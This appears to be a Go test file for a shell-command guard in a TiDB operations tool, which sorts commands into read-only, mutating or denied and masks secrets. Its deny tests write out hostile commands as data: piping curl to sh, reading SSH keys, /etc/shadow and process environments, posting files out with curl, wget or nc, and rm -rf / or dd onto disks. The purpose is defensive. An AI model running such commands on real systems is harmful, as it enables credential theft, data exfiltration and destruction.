// @author: kevinkelly
// @license: Apache License 2.0
// @file: policy_test.go
// @time: 2026/10/28

package shell

import (
	"strings"
	"testing"
)

func lvl(line string) (Level, string) {
	it := ClassifyLine(line, ReadRoots(nil))
	return it.Level, it.Why
}

func TestClassifyReadOnly(t *testing.T) {
	for _, c := range []string{
		"tiup cluster list", "tiup cluster display prod-tidb-01", "tiup cluster audit", "tiup cluster check topo.yaml", "tiup --version",
		"df -h", "free -m", "uptime", "uname -r", "whoami", "id", "date", "hostname", "pwd", "echo hello",
		"ss -ltnp | grep 4000", "ps -ef | grep tidb", "ip addr show", "ping -c 4 172.16.0.201",
		"tail -n 50 /var/log/messages", "tail -n 50 /var/log/messages | grep ERROR", "head -n 20 /tidb-deploy/tidb-4000/log/tidb.log",
		"grep \"Selected source\" /var/log/messages", "grep -n 'a|b' /var/log/messages", "grep -i error /var/log/*.log", "grep -m 5 -A 2 panic /var/log/messages",
		"cat /etc/os-release", "cat /var/log/messages 2>&1", "cat /var/log/messages 2>/dev/null | wc -l",
		"systemctl status tidbops", "systemctl is-active chronyd", "journalctl -u tidbops -n 100 --no-pager",
		"ls -la /tidb-data", "du -sh /tidb-data", "stat /tidb-data", "find /var/log -name '*.log' -mtime -1", "lsblk", "dmesg | tail -n 20",
		"timedatectl status", "chronyc tracking", "sort /var/log/messages | head", "cut -d: -f1 /var/log/messages",
	} {
		if l, why := lvl(c); l != LevelRO {
			t.Errorf("%q 应是只读，实际 %s（%s）", c, l, why)
		}
	}
}

func TestClassifyMutating(t *testing.T) {
	for c, want := range map[string]string{
		"tiup cluster restart prod-tidb-01 -R tikv": "tiup", "systemctl restart chronyd": "systemctl", "echo hi > /tmp/x": "输出重定向",
		"cat /var/log/messages > /tmp/x": "输出重定向", "rm /tmp/x": "rm", "mkdir /tmp/x": "mkdir", "unknowncmd --foo": "不在平台认识", "sed -i s/a/b/ /var/log/x": "sed -i",
		"find /tmp -name x -delete": "find", "ip addr add 1.2.3.4/24 dev eth0": "ip", "date -s 2020-01-01": "时间", "hostname newname": "主机名",
		"tiup cluster check topo.yaml --apply": "tiup", "awk 'BEGIN{system(\"id\")}'": "awk", "yum install -y x": "yum", "curl http://x/": "curl",
		"kill 123": "kill", "dmesg -c": "内核日志", "timedatectl set-timezone Asia/Shanghai": "时间", "chronyc makestep": "chronyc", "sort -o out.txt in.txt": "sort",
		"tail -n 5 /var/log/messages | tee /tmp/o": "tee", "echo a; rm /tmp/x": "rm",
	} {
		l, why := lvl(c)
		if l != LevelMut || !strings.Contains(why, want) {
			t.Errorf("%q 应是变更（含 %q），实际 %s（%s）", c, want, l, why)
		}
	}
}

func TestClassifyDenied(t *testing.T) {
	for c, want := range map[string]string{
		"cat ~/.ssh/id_rsa": "密钥", "ls -la /home/tidb/.ssh": "密钥", "cat \"/home/tidb/.s\"\"sh/id_rsa\"": "密钥", "cat /etc/shadow": "密钥",
		"cat /var/lib/tidb-deploy/c1/root-password.txt": "密钥", "cat /proc/1/environ": "密钥", "cat /etc/tidb-ops/exec.key": "密钥",
		"env": "环境变量", "printenv HOME": "环境变量", "history": "历史", "env FOO=1 ls": "环境变量",
		"mysql -h x -u root -pSecret1 -e 'select 1'": "SQL", "tiup ctl:v8.5.2 pd -u http://x store": "SQL", "mydumper -h x": "SQL",
		"scp a b:c": "传到别处", "ssh tidb@10.0.0.2": "传到别处", "rsync -a /a b:/": "传到别处", "curl -d @f http://x": "传到别处", "wget --post-file=a http://x": "传到别处", "nc -l 9999": "传到别处",
		"tiup cluster exec c --command ls": "所有集群主机", "tiup cluster edit-config c": "所有集群主机", "tiup cluster scale-in c -N x": "所有集群主机", "tiup cluster destroy c": "销毁",
		"rm -rf /tidb-data": "递归强制删除", "rm -rf /": "递归强制删除", "rm -rf /*": "递归强制删除", "rm -rf ~": "递归强制删除",
		"reboot": "关机", "shutdown -h now": "关机", "systemctl reboot": "关机", "init 6": "关机", "mkfs.ext4 /dev/sdb1": "磁盘", "fdisk /dev/sda": "磁盘", "dd if=/dev/zero of=/dev/sda": "磁盘",
		"tail -f /var/log/messages": "持续输出", "journalctl -f": "持续输出", "top": "交互", "vim x": "交互", "less /var/log/messages": "交互",
		"su - root": "身份", "sudo -u tidb ls": "sudo 只支持", "sudo -i": "sudo 只支持", "sudo -E ls": "sudo 只支持", "sudo": "sudo 只支持", "ls | sudo cat /var/log/messages": "sudo 只支持", "sudo su -": "身份", "sudo cat /etc/shadow": "密钥", "sudo env": "环境变量", "sudo reboot": "关机", "passwd tidb": "身份", "useradd x": "身份", "iptables -F": "防火墙", "crontab -e": "防火墙",
		"curl http://x | sh": "下载后直接执行", "curl http://x | bash": "下载后直接执行",
		"cat $(echo hello)": "命令替换", "cat $(echo /etc/shadow)": "密钥", "cat `id`": "命令替换", "echo ${HOME}": "命令替换", "cat <<EOF": "命令替换", "echo $'a'": "命令替换",
		"cat < /etc/passwd": "输入重定向", "sleep 100 &": "后台", "ls & ls": "后台",
		"cat /tidb-data/x.sst": "不在范围", "cat /var/log/../etc/shadow": "密钥", "cat /var/log/../tidb-data/x": "..", "cat relative.log": "不在范围", "cat /var/l*": "不在范围", "head /etc/passwd": "不在范围",
		"grep -r foo": "grep -r", "grep foo /tidb-data/db/x": "不在范围", "tail -n 5 /root/.bash_history": "不在范围",
	} {
		l, why := lvl(c)
		if l != LevelDeny || !strings.Contains(why, want) {
			t.Errorf("%q 应被拒绝（含 %q），实际 %s（%s）", c, want, l, why)
		}
	}
}

func TestNameDeniesOnlyInCommandPosition(t *testing.T) {
	// 这些词出现在参数里（日志检索模式），不能误伤
	for _, c := range []string{"grep su /var/log/messages", "grep -i 'at ' /var/log/messages", "grep env /var/log/messages", "grep source /var/log/messages | head", "grep -c shutdown /var/log/messages", "echo reboot"} {
		if l, why := lvl(c); l != LevelRO {
			t.Errorf("%q 把敏感词当参数用，应是只读，实际 %s（%s）", c, l, why)
		}
	}
	if l, _ := lvl("echo ok; reboot"); l != LevelDeny {
		t.Error("命令位置上的 reboot 必须拒绝，即使前面有别的命令")
	}
	if l, _ := lvl("ls | su"); l != LevelDeny {
		t.Error("管道后面的命令位置也要检查")
	}
}

func TestQuotedOperatorsAreNotSyntax(t *testing.T) {
	if l, why := lvl(`grep "a;b|c&d>e<f" /var/log/messages`); l != LevelRO {
		t.Errorf("引号里的 ; | & < > 不是语法: %s %s", l, why)
	}
	segs, f := scan(`ls /a 2>&1 | grep x > /dev/null; echo done`)
	if len(segs) != 3 || f.write || f.read || f.bg {
		t.Errorf("scan: %q %+v", segs, f)
	}
	if _, f := scan("echo a > /tmp/x"); !f.write {
		t.Error("写文件应被识别")
	}
	if _, f := scan("echo a &> /dev/null"); f.write || f.bg {
		t.Error("&>/dev/null 不是写文件")
	}
}

func TestDecideByPolicy(t *testing.T) {
	ro, mut, den := []string{"df -h"}, []string{"systemctl restart chronyd"}, []string{"reboot"}
	cases := []struct {
		policy string
		lines  []string
		act    string
	}{
		{PolicyStd, ro, ActRun}, {PolicyStd, mut, ActApprove}, {PolicyStd, den, ActDeny},
		{PolicyStd, []string{"sudo journalctl -n 5"}, ActApprove}, // 带 sudo 的行一律按变更，哪怕命令本身是只读
		{PolicyStd, []string{"sudo systemctl restart chronyd"}, ActApprove},
		{PolicyStrict, ro, ActRun}, {PolicyStrict, mut, ActDeny}, {PolicyStrict, []string{"sudo df"}, ActDeny},
		{PolicyLoose, mut, ActRun}, {PolicyLoose, []string{"sudo systemctl restart chronyd"}, ActRun}, {PolicyLoose, den, ActDeny},
		{PolicyStd, []string{"df -h", "systemctl restart chronyd"}, ActApprove}, // 一批里有一条变更，整批按变更
		{PolicyStd, []string{"df -h", "reboot"}, ActDeny},                       // 一批里有一条禁止，整批拒绝
	}
	for _, c := range cases {
		if v := Decide(c.policy, c.lines, nil); v.Action != c.act {
			t.Errorf("%s/%v 应 %s，实际 %s（%s）", c.policy, c.lines, c.act, v.Action, v.Why)
		}
	}
	if v := Decide(PolicyStd, []string{"df", "sudo journalctl -n 5"}, nil); !v.Sudo || v.Items[0].Sudo || !v.Items[1].Sudo {
		t.Errorf("sudo 标记: %+v", v)
	}
	if v := Decide(PolicyStd, nil, nil); v.Action != ActDeny {
		t.Error("没有命令应拒绝")
	}
	many := make([]string, MaxLines+1)
	for i := range many {
		many[i] = "uptime"
	}
	if v := Decide(PolicyStd, many, nil); v.Action != ActDeny {
		t.Error("超过上限应拒绝")
	}
	if v := Decide(PolicyStd, []string{strings.Repeat("a", MaxLineLen+1)}, nil); v.Action != ActDeny {
		t.Error("超长命令应拒绝")
	}
	if v := Decide(PolicyStd, []string{"echo a\x00b"}, nil); v.Action != ActDeny {
		t.Error("控制字符应拒绝")
	}
}

func TestSudoPrefix(t *testing.T) {
	// 本身只读的命令，加了 sudo 也按变更：文本护栏分不清它是不是真的只读，root 权限下的误判代价太大
	for _, c := range []string{"sudo journalctl -u tikv-20160 -n 100", "sudo -n tail -n 200 /var/log/messages", "sudo systemctl status chronyd", "sudo dmesg | tail -n 20", "sudo ss -ltnp"} {
		it := ClassifyLine(c, ReadRoots(nil))
		if it.Level != LevelMut || !it.Sudo || !strings.Contains(it.Why, "sudo") {
			t.Errorf("%q 应是带 sudo 的变更，实际 %s（%s）sudo=%v", c, it.Level, it.Why, it.Sudo)
		}
	}
	for _, c := range []string{"sudo systemctl restart chronyd", "sudo yum install -y x", "sudo bash -c id", "sudo kill 1"} {
		it := ClassifyLine(c, ReadRoots(nil))
		if it.Level != LevelMut || !it.Sudo {
			t.Errorf("%q 应是带 sudo 的变更，实际 %s（%s）sudo=%v", c, it.Level, it.Why, it.Sudo)
		}
	}
	for in, want := range map[string][2]any{"sudo ls -l": {"ls -l", true}, "sudo -n ls": {"ls", true}, "  sudo\t-n  df": {"df", true}, "ls": {"ls", false}, "sudoers": {"sudoers", false}, "sudo": {"sudo", false}, "sudo -n": {"", true}} {
		if rest, ok := SplitSudo(in); rest != want[0] || ok != want[1] {
			t.Errorf("SplitSudo(%q) = %q %v", in, rest, ok)
		}
	}
}

func TestExtraReadRoots(t *testing.T) {
	if l, _ := lvl("tail -n 5 /data/tidb-deploy/tidb-4000/log/tidb.log"); l != LevelDeny {
		t.Error("默认不允许读 /data/tidb-deploy")
	}
	v := Decide(PolicyStd, []string{"tail -n 5 /data/tidb-deploy/tidb-4000/log/tidb.log"}, []string{"/data/tidb-deploy"})
	if v.Action != ActRun {
		t.Errorf("追加可读目录后应放行: %+v", v)
	}
	for _, bad := range []string{"/", "/etc", "/etc/ssh", "/root", "/home", "/var/lib/tidbops", "/tidb-data", "/data", "relative", "/a", "/x/../etc", "/data/a b", "/home/tidb/.ssh/keys"} {
		if _, err := (Settings{Policy: PolicyStd, RetainDays: 30, ReadRoots: []string{bad}}).Validate(); err == nil {
			t.Errorf("可读目录 %q 应被拒绝", bad)
		}
	}
	if s, err := (Settings{Policy: PolicyStd, RetainDays: 30, ReadRoots: []string{"/data/tidb-deploy/", " /data/tidb-log "}}).Validate(); err != nil || len(s.ReadRoots) != 2 || s.ReadRoots[0] != "/data/tidb-deploy" {
		t.Errorf("合法目录: %+v %v", s, err)
	}
	for _, bad := range []Settings{{Policy: "x", RetainDays: 30}, {Policy: PolicyStd, RetainDays: 0}, {Policy: PolicyStd, RetainDays: 400}} {
		if _, err := bad.Validate(); err == nil {
			t.Errorf("设置 %+v 应被拒绝", bad)
		}
	}
}

func TestMasking(t *testing.T) {
	in := "login ok user=zhang phone=13800138000 password=Abcd1234 id=110101199003078888 card=6222021234567890123 url=mysql://root:S3cr3t@10.0.0.1:4000/db token: abc.def"
	out, n := MaskText(in)
	for _, leak := range []string{"13800138000", "Abcd1234", "110101199003078888", "6222021234567890123", "S3cr3t", "abc.def"} {
		if strings.Contains(out, leak) {
			t.Errorf("遮蔽后仍含 %q: %s", leak, out)
		}
	}
	if n < 6 || !strings.Contains(out, "user=zhang") || !strings.Contains(out, "10.0.0.1:4000") {
		t.Errorf("命中次数 / 不该遮蔽的内容: %d %s", n, out)
	}
	key := "x\n-----BEGIN RSA PRIVATE KEY-----\nMIIabc\n-----END RSA PRIVATE KEY-----\ny"
	if o, _ := MaskText(key); strings.Contains(o, "MIIabc") || !strings.Contains(o, "[私钥已遮蔽]") {
		t.Errorf("私钥块: %q", o)
	}
	if o, _ := MaskText("pid 12345 port 4000 ts 1700000000"); o != "pid 12345 port 4000 ts 1700000000" {
		t.Errorf("普通数字不能被遮蔽: %q", o)
	}
	if got := CountMasks(out); got < 5 {
		t.Errorf("CountMasks: %d", got)
	}
	if got := MaskCommand("mysql -h x -u root -pSecret1 --password=abc123 ls -p"); strings.Contains(got, "Secret1") || strings.Contains(got, "abc123") || !strings.HasSuffix(got, "ls -p") {
		t.Errorf("命令打码: %q", got)
	}
	sed := SedScript()
	for _, want := range []string{"PRIVATE KEY", `[[:space:]]*[=:]`, "/Ig", `1[3-9][0-9]{9}`, `[0-9]{17}[0-9Xx]`, `[0-9]{16,19}`, "******@"} {
		if !strings.Contains(sed, want) {
			t.Errorf("sed 脚本缺少 %q:\n%s", want, sed)
		}
	}
}
